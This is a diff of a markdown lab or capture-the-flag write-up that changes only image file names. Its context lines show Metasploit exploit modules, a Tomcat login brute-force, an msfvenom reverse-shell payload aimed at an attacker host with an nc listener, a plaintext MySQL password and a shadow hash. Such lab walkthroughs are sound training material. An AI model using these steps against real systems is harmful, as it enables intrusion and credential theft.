@@ -88,7 +88,7 @@ Nmap done: 3 IP addresses (3 hosts up) scanned in 6.98 seconds
 
 ### Website
 
-![](<../../../../.gitbook/assets/image (55) (1).png>)
+![](<../../../../.gitbook/assets/image (55) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (32) (1).png>)
 
@@ -108,7 +108,7 @@ use exploit/multi/http/werkzeug_debug_rce
 
 ![](<../../../../.gitbook/assets/image (59) (1).png>)
 
-![](<../../../../.gitbook/assets/image (64) (1).png>)
+![](<../../../../.gitbook/assets/image (64) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (8).png>)
 
@@ -128,7 +128,7 @@ mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 
 ![](<../../../../.gitbook/assets/image (11).png>)
 
-![](<../../../../.gitbook/assets/image (54) (1).png>)
+![](<../../../../.gitbook/assets/image (54) (1) (1).png>)
 
 ### Exploit
 
@@ -138,7 +138,7 @@ use exploit/multi/mysql/mysql_udf_payload
 
 ![](<../../../../.gitbook/assets/image (65) (1).png>)
 
-![](<../../../../.gitbook/assets/image (46).png>)
+![](<../../../../.gitbook/assets/image (46) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (52) (1).png>)
 
@@ -154,7 +154,7 @@ use exploit/multi/mysql/mysql_udf_payload
 dirb http://192.6.232.5:8080
 ```
 
-![](<../../../../.gitbook/assets/image (51) (1).png>)
+![](<../../../../.gitbook/assets/image (51) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (19) (1).png>)
 
@@ -168,7 +168,7 @@ dirb http://192.6.232.5:8080
 use auxiliary/scanner/http/tomcat_mgr_login
 ```
 
-![](<../../../../.gitbook/assets/image (53) (1).png>)
+![](<../../../../.gitbook/assets/image (53) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (57) (1).png>)
 
@@ -182,7 +182,7 @@ use auxiliary/scanner/http/tomcat_mgr_login
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o revshell.war
 ```
 
-![](<../../../../.gitbook/assets/image (36) (1).png>)
+![](<../../../../.gitbook/assets/image (36) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (30) (1).png>)
 
@@ -194,7 +194,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o re
 nc -lvp 6666
 ```
 
-![](<../../../../.gitbook/assets/image (47).png>)
+![](<../../../../.gitbook/assets/image (47) (1).png>)
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -202,9 +202,9 @@ CTRL+Z
 stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 
-![Flag1: EBCFE35ACC27E0EA91CF3A5AB600BABE](<../../../../.gitbook/assets/image (39) (1).png>)
+![Flag1: EBCFE35ACC27E0EA91CF3A5AB600BABE](<../../../../.gitbook/assets/image (39) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (17) (1).png>)
+![](<../../../../.gitbook/assets/image (17) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (42) (1).png>)
 
@@ -217,7 +217,7 @@ robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1
 
 ![](<../../../../.gitbook/assets/image (67) (1).png>)
 
-![](<../../../../.gitbook/assets/image (63) (1).png>)
+![](<../../../../.gitbook/assets/image (63) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (48).png>)
 
